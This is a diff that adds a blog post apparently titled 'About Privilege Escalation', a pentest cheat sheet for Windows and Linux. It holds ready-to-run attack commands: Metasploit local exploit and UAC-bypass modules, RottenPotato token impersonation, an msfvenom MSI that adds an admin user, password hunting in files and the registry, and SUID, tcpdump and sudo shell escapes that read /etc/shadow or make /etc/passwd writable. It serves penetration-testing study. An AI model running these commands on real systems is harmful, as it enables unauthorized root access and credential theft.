@@ -161,225 +161,303 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">About Privilege Escalation</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/img/aliwangwang.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">TyeYeah</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2021-02-19 10:01:30</span>
+        <span class="mobile">2021-02-19 10:01</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Penetration-Testing/">Penetration Testing</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/linux/">linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/windows/">windows</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/pentest/">pentest</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.7k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>10 Mins</span>
+        </span>
+    
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <p>Recently I get some time to collect materials about privilege escalation, provide you with useful tools and some basic knowledge (overview, not details).</p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>You can refer to <a class="link"   target="_blank" rel="noopener" href="https://www.fuzzysecurity.com/tutorials/16.html" >Windows Privilege Escalation Fundamentals<i class="fas fa-external-link-alt"></i></a> and <a class="link"   target="_blank" rel="noopener" href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" >Windows Privilege Escalation Guide<i class="fas fa-external-link-alt"></i></a>.</p>
+<p>We skip <a href="/2020/03/12/2020-03-12-Domain-Pentest-Intro/#Information-Gathering">Information Gathering</a> part and continue learning other things.</p>
+<h3 id="Kernel-Exploit"><a href="#Kernel-Exploit" class="headerlink" title="Kernel Exploit"></a>Kernel Exploit</h3><p>Tools to search patch vulnerability </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bitsadmin/wesng</span><br><span class="line">https://github.com/ianxtianxt/win-exp-</span><br><span class="line">https://github.com/SecWiki/windows-kernel-exploits</span><br></pre></td></tr></table></figure>
+<p>Or</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># query manual</span></span><br><span class="line">&gt; systeminfo</span><br><span class="line">&gt; Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">post/windows/gather/enum_patches</span><br><span class="line">post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line"><span class="comment"># Powershell script</span></span><br><span class="line">&gt; <span class="built_in">Import-Module</span> C:\Sherlock.ps1 (from `https://github.com/rasta<span class="literal">-mouse</span>/Sherlock`)</span><br><span class="line">&gt; <span class="built_in">Find-AllVulns</span></span><br></pre></td></tr></table></figure>
+<p>Or use crafted <code>wmic_info.bat</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;delims=&quot;</span> %%A <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b %WINDIR%\system32\*htable.xsl&#x27;</span>) <span class="keyword">do</span> <span class="built_in">set</span> <span class="string">&quot;var=%%A&quot;</span></span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> get CSName,Description,ExecutablePath,ProcessId /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic <span class="built_in">group</span> list full /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic nicconfig <span class="built_in">where</span> IPEnabled=<span class="string">&#x27;true&#x27;</span> get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br></pre></td></tr></table></figure>
 
+<p>And some MSF exploits:<br>Windows ClientCopyImage Win32k Exploit</p>
+<ul>
+<li>Windows 7 x64, x86, Windows 2008 R2 SP1 x64</li>
+<li>exploit&#x2F;windows&#x2F;local&#x2F;ms15_051_client_copy_image</li>
+</ul>
+<p>Windows TrackPopupMenu Win32k NULL pointer dereference</p>
+<ul>
+<li>Windows XP SP3, Windows Server 2003 SP2, Windows 7 SP1 Windows Server 2008 32, Windows Server 2008 R2 SP1 64</li>
+<li>exploit&#x2F;windows&#x2F;local&#x2F;ms14_058_track_popup_menu</li>
+</ul>
+<p>KiTrap0D exploit</p>
+<ul>
+<li>Windows Server 2003 32, Windows Server 2008 32, Windows 7 32, Windows XP</li>
+<li>exploit&#x2F;windows&#x2F;local&#x2F;ms10_015_kitrap0d</li>
+</ul>
+<p>Task Scheduler XML escalation</p>
+<ul>
+<li>Windows Vista, Windows 7, Windows Server 2008 x64 and x86</li>
+<li>exploit&#x2F;windows&#x2F;local&#x2F;ms10_092_schelevator</li>
+</ul>
+<p>MS16-016 mrxdav.sys WebDav local escalation</p>
+<ul>
+<li>Windows 7 SP1 x86</li>
+<li>exploit&#x2F;windows&#x2F;local&#x2F;ms16_016_webdav</li>
+</ul>
+<p>EPATHOBJ::pprFlattenRec local escalation</p>
+<ul>
+<li>Windows XP SP3, Windows 2003 SP1, Windows 7 SP1</li>
+<li>exploit&#x2F;windows&#x2F;local&#x2F;ppr_flatten_rec</li>
+</ul>
+<p>MS13-053 : NTUserMessageCall Win32k kernel pool overflow</p>
+<ul>
+<li>Windows 7 SP1 x86</li>
+<li>exploit&#x2F;windows&#x2F;local&#x2F;ms13_053_ schlamperei</li>
+</ul>
+<p>MS16-032 Secondary Logon Handle escalation</p>
+<ul>
+<li>Windows 7-10, 2k8-2k12 32&#x2F;64, Powershell 2.0 and higher Windows version</li>
+<li>exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</li>
+</ul>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato" >RottenPotato<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; load incognito <span class="comment"># or use incognito</span></span><br><span class="line">meterpreter&gt; list_token -u  <span class="comment"># see any token to use</span></span><br><span class="line">WIN-2HU3N1\Administrator</span><br><span class="line">meterpreter&gt; impersonate_token WIN-2HU3N1\\Administrator</span><br><span class="line"><span class="comment"># or use rotten potato directly</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/foxglovesec/RottenPotato.git</span><br><span class="line">$ <span class="built_in">cd</span> RottenPotato</span><br><span class="line"><span class="comment"># find rottenpotato.exe</span></span><br><span class="line">meterpreter&gt; upload /root/Desktop/RottenPotato/rottenpotato.exe .</span><br><span class="line">meterpreter&gt; execute -Hc -f rottenpotato.exe</span><br><span class="line">meterpreter&gt; impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
+<h3 id="Config-Error"><a href="#Config-Error" class="headerlink" title="Config Error"></a>Config Error</h3><p>This includes system service priv setting error, trusted service path vulns, scheduled tasks.</p>
+<p>Methods to check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Empire module</span><br><span class="line">privesc/powerup/allchecks</span><br></pre></td></tr></table></figure>
+<p>System service privilege config:<br>As services started when booting up are with high privs, if they are exploitable, we can use them to elevate.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Powershell attack script</span></span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</span><br><span class="line"><span class="comment"># MSF attack module, need a given session</span></span><br><span class="line">exploit/windows/local/service_permissions</span><br></pre></td></tr></table></figure>
+<p>Trusted service path vulns:<br>If a service executable path is without <code>&quot;</code> and has <code>&lt;space&gt;</code>, then it is vulnerable.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Search vulnerable service</span></span><br><span class="line">&gt; wmic service get name,displayname,pathname,startmode | findstr /i <span class="string">&quot;Auto&quot;</span> | findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span> | findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"># MSF attack module</span></span><br><span class="line"><span class="string">exploit/windows/local/trusted_service_path</span></span><br><span class="line"><span class="string"># Need to migrate, because it disconnect automatically</span></span><br><span class="line"><span class="string">set AutoRunScript migrate -f</span></span><br></pre></td></tr></table></figure>
+<p>Scheduled tasks:<br>Since tasks executed by high privileged users, if service dirs are editable, they are vlunerable.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Check scheduled tasks </span></span><br><span class="line">&gt; schtasks /query /fo LIST /v</span><br><span class="line"><span class="comment"># Check privs of specified dir</span></span><br><span class="line">&gt; accesschk.exe <span class="literal">-dqv</span> <span class="string">&quot;D:\test&quot;</span> <span class="literal">-accepteula</span></span><br></pre></td></tr></table></figure>
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+<h3 id="GPP-Privilege-Escalation"><a href="#GPP-Privilege-Escalation" class="headerlink" title="GPP Privilege Escalation"></a>GPP Privilege Escalation</h3><p>Group Policy Preferences (GPP) </p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Powershell obtain cpassword</span></span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/<span class="built_in">Get-GPPPassword</span>.ps1</span><br><span class="line"><span class="comment">#MSF</span></span><br><span class="line">post/windows/gather/credentials/gpp</span><br><span class="line"><span class="comment">#Empire</span></span><br><span class="line">usemodule privesc/gpp</span><br></pre></td></tr></table></figure>
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
+<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MSF</span></span><br><span class="line">exploit/windows/local/ask       <span class="comment"># pop up a window, click to get system</span></span><br><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_fodhelper</span><br><span class="line">exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">exploit/windows/local/bypassuac_comhijack</span><br><span class="line"><span class="comment">#Powershell</span></span><br><span class="line">https://github.com/samratashok/nishang/blob/master/Escalation/<span class="built_in">Invoke-PsUACme</span>.ps1</span><br><span class="line"><span class="comment">#Empire</span></span><br><span class="line">usemodule privesc/bypassuac</span><br><span class="line">usemodule privesc/bypassuac_wscript</span><br></pre></td></tr></table></figure>
 
-    }
+<h3 id="Token-Stealing"><a href="#Token-Stealing" class="headerlink" title="Token Stealing"></a>Token Stealing</h3><p>Use <a class="link"   target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato" >RottenPotato<i class="fas fa-external-link-alt"></i></a>.</p>
+<h3 id="Without-Token"><a href="#Without-Token" class="headerlink" title="Without Token"></a>Without Token</h3><p>Use <a class="link"   target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder" >Responder.py<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="For-Different-OS-Version"><a href="#For-Different-OS-Version" class="headerlink" title="For Different OS Version"></a>For Different OS Version</h3><ol>
+<li><p>Windows2000&#x2F;2003, XP<br>Use <code>at</code>(set scheduled tasks) to let users in <code>Administrator</code> group elevated to <code>SYSTEM</code> </p>
+</li>
+<li><p>Windows 7&#x2F;8, 03&#x2F;08, 12&#x2F;16</p>
+</li>
+</ol>
+<ul>
+<li><p><code>sc</code> to control service</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">sc</span> Create syscmd binPath= <span class="string">&quot;cmd /K start&quot;</span> <span class="built_in">type</span>= own <span class="built_in">type</span>= interact</span><br><span class="line">&gt; <span class="built_in">sc</span> <span class="built_in">start</span> systcmd</span><br></pre></td></tr></table></figure></li>
+<li><p>AlwaysInstallElevated: allow non-admin users run <code>*.msi</code> to install with <code>SYSTEM</code> privs</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># disabled by default</span></span><br><span class="line">[<span class="type">HKEY_CURRENT_USER</span>\<span class="type">SOFTWARE</span>\<span class="type">Policies</span>\<span class="type">Microsoft</span>\<span class="type">Windows</span>\<span class="type">Installer</span>] “AlwaysInstallElevated”=dword:<span class="number">00000001</span></span><br><span class="line">[<span class="type">HKEY_LOCAL_MACHINE</span>\<span class="type">SOFTWARE</span>\<span class="type">Policies</span>\<span class="type">Microsoft</span>\<span class="type">Windows</span>\<span class="type">Installer</span>] “AlwaysInstallElevated”=dword:<span class="number">00000001</span></span><br><span class="line"><span class="comment"># check using</span></span><br><span class="line">C:&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">C:&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"><span class="comment"># if not vulnerable</span></span><br><span class="line">ERROR: The system was unable to find the specified registry key or value.</span><br><span class="line"><span class="comment"># else it prints key values</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># attack</span></span><br><span class="line">&gt; msfvenom <span class="literal">-p</span> windows/adduser USER=rottenadmin PASS=P@ssword123! <span class="operator">-f</span> msi<span class="literal">-nouac</span> <span class="literal">-o</span> rotten.msi</span><br><span class="line">&gt; msiexec /quiet /qn /i C:\programdata\rotten.msi</span><br><span class="line"><span class="comment"># /quiet    forbid sending messages to user when installing</span></span><br><span class="line"><span class="comment"># /qn       no GUI</span></span><br><span class="line"><span class="comment"># /i        specify the program</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">exploit/windows/local/always_install_elevated</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Unattended Installs: a XML file named Unattended, contains all configs about program installation, like account config<br>They are under dirs:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Panther\</span><br><span class="line">C:\Windows\Panther\Unattend\</span><br><span class="line">C:\Windows\System32\</span><br><span class="line">C:\Windows\System32\sysprep\</span><br></pre></td></tr></table></figure>
+<p>Except <code>Unattend.xml</code>, the <code>sysprep.xml</code> and <code>sysprep.inf</code> are also contains something</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">dir</span> C:*vnc.ini /s /b /c</span><br><span class="line">&gt; <span class="built_in">dir</span> C:\ /s /b /c | findstr /sr *password*</span><br><span class="line">&gt; findstr /<span class="built_in">si</span> password *.txt | *.xml | *.ini</span><br><span class="line">&gt; reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">&gt; reg query HKCU /f password /t REG_SZ /s</span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">post/windows/gather/enum_unattend</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="3">
+<li>CVE</li>
+</ol>
+<ul>
+<li>Windows10      CVE-2020-0796 </li>
+<li>Windows7&#x2F;2008  CVE-2018-8120 </li>
+<li>Windows7&#x2F;8、2008&#x2F;2012&#x2F;2016     CVE-2017-0213 </li>
+<li>SQL Server, IIS (just for local, not domain) <a class="link"   target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075" >MS16-075(RottenPotato)<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<h3 id="Other-Methods"><a href="#Other-Methods" class="headerlink" title="Other Methods"></a>Other Methods</h3><p>For there are toooo much knowledge to mention, maybe it’s better to google just when you need them.</p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>You can refer to <a class="link"   target="_blank" rel="noopener" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" >Basic Linux Privilege Escalation<i class="fas fa-external-link-alt"></i></a>, and info gathering part is related to <a href="/2019/05/07/2019-05-07-Linux-Security-Response/">Linux Security Response</a>  .<br>Here recommends some tools: </p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum" >LinEnum<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy" >pspy - unprivileged Linux process snooping<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/audit/unix-privesc-check" >unix-privesc-check<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py" >Linprivchecker.py<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<h3 id="Kernel-Exploit-1"><a href="#Kernel-Exploit-1" class="headerlink" title="Kernel Exploit"></a>Kernel Exploit</h3><p>Normally we should have:</p>
+<ol>
+<li>vulnerable kernel</li>
+<li>corresponding exploit program</li>
+<li>able to transfer exploit to the target</li>
+<li>able to run it, and let kernel run our payload</li>
+</ol>
+<p>Search exploits by</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:exploit-db.com kernel version python linprivchecker.py extended</span><br></pre></td></tr></table></figure>
+<p>Some CVEs for example: CVE-2015-1328, CVE-2016-5195, CVE-2017-16995, CVE-2018-18955, CVE-2018-1000001, CVE-2019-13272. To test them, visit <a class="link"   target="_blank" rel="noopener" href="http://old-releases.ubuntu.com/releases/" >This<i class="fas fa-external-link-alt"></i></a> and <a class="link"   target="_blank" rel="noopener" href="https://kernel.ubuntu.com/~kernel-ppa/mainline/" >That<i class="fas fa-external-link-alt"></i></a> for old images and old kernels.</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40839" >DirtyCow<i class="fas fa-external-link-alt"></i></a>(CVE-2016-5195) is a typical vulnerability to perform privilege escalation, which can handle many kernel versions: <a class="link"   target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" >PoCs<i class="fas fa-external-link-alt"></i></a></p>
+<p>More exploit can be found at <a class="link"   target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits" >linux-kernel-exploits<i class="fas fa-external-link-alt"></i></a>, but it is not recommended, because after that computer may be unstable and easy to crash. </p>
+<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><p>This part can refer to <a class="link"   target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/25/suid-executables/" >SUID Executables<i class="fas fa-external-link-alt"></i></a> by <a class="link"   target="_blank" rel="noopener" href="https://pentestlab.blog/" >penetration testing lab<i class="fas fa-external-link-alt"></i></a>. </p>
+<p>Other methods:</p>
+<ul>
+<li>Use <code>cp</code> to overwrite <code>/etc/shadow</code></li>
+<li>Use <code>mv</code> to overwrite <code>/etc/shadow</code>, <code>/etc/sudoers</code></li>
+<li><code>awk</code>: <code>awk &#39;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code></li>
+<li><code>man</code>: <ul>
+<li><code>man passwd</code></li>
+<li><code>!/bin/bash</code></li>
+</ul>
+</li>
+<li><code>python</code>&#x2F;<code>perl</code>&#x2F;<code>ruby</code>&#x2F;<code>lua</code>&#x2F;etc<ul>
+<li>refer to <a href="/2020/03/31/2020-03-31-About-Reverse-Shell/">About Reverse Shell</a></li>
+</ul>
+</li>
+<li><code>tcpdump</code><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $<span class="string">&#x27;id\ncat /etc/shadow&#x27;</span> &gt; /tmp/.<span class="built_in">test</span></span><br><span class="line">$ chmod +x /tmp/.<span class="built_in">test</span></span><br><span class="line">$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.<span class="built_in">test</span> -Z root</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>A cheat sheet for <code>Linux</code> privilege escalation is <a class="link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/" >GTFOBins<i class="fas fa-external-link-alt"></i></a>.</p>
+<p>echo ‘import os,stat ;os.chmod(“&#x2F;etc&#x2F;passwd”, stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)’ &gt;&gt; test.py</p>
+<h3 id="SUDO"><a href="#SUDO" class="headerlink" title="SUDO"></a>SUDO</h3><p>The <code>sudo</code> command is to let normal user execute one command as <code>root</code> user, and the configurations are stored in <code>/etc/sudoers</code>.</p>
+<p>Format of <code>/etc/sudoers</code> should be like</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL) ALL</span><br><span class="line"># let `root` user on `ALL(1)` terminal to be as `ALL(1)` user to execute `ALL(3)` commands</span><br><span class="line">attacker ALL=(ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>
+<p>Use <code>sudo -l</code> to list all allowed commands, the exploit methods are similar to <code>SUID</code>.</p>
+<h3 id="Cronjob"><a href="#Cronjob" class="headerlink" title="Cronjob"></a>Cronjob</h3><p>Since the crontab tasks are executed by <code>root</code> user, if any config file is editable by normal users, you can let root user execute anything you want. </p>
+<p>To sum up, the <code>SUID</code>, <code>SUDO</code> and Cron jobs all depends on writing things by normal user and being executed by <code>root</code> user</p>
+<h3 id="in-PATH"><a href="#in-PATH" class="headerlink" title=". in $PATH"></a><code>.</code> in $PATH</h3><p>We always run binary in current dir with <code>./binary</code>, while if we add <code>.</code> in <code>$PATH</code> we can run <code>binary</code> directly.</p>
+<p>However if attackers make an evil <code>ls</code> or <code>cat</code> or something, and lure <code>root</code> user to enter that dir and execute, it is attacked.</p>
+<h3 id="Other-Techniques"><a href="#Other-Techniques" class="headerlink" title="Other Techniques"></a>Other Techniques</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" >Exploiting Wildcard for Privilege Escalation<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="Other-Useful-Tools"><a href="#Other-Useful-Tools" class="headerlink" title="Other Useful Tools"></a>Other Useful Tools</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" >Windows-Exploit-Suggester<i class="fas fa-external-link-alt"></i></a> and <a class="link"   target="_blank" rel="noopener" href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" >Linux_Exploit_Suggester<i class="fas fa-external-link-alt"></i></a> (quite old).</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/mzfr/gtfo" >gtfo<i class="fas fa-external-link-alt"></i></a> which searches the <a class="link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/" >GTFOBins<i class="fas fa-external-link-alt"></i></a> (for <code>linux</code>) and <a class="link"   target="_blank" rel="noopener" href="https://lolbas-project.github.io/" >LOLBAS<i class="fas fa-external-link-alt"></i></a> (for <code>windows</code>) in <code>Python 3</code>, using system commands to elevate.</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" >PEASS - Privilege Escalation Awesome Scripts SUITE<i class="fas fa-external-link-alt"></i></a> also provides exploit for both <code>linux</code> and <code>windows</code>.</p>
+<p>A pack for <a class="link"   target="_blank" rel="noopener" href="https://github.com/lyshark/Windows-exploits" >Windows-exploits<i class="fas fa-external-link-alt"></i></a></p>
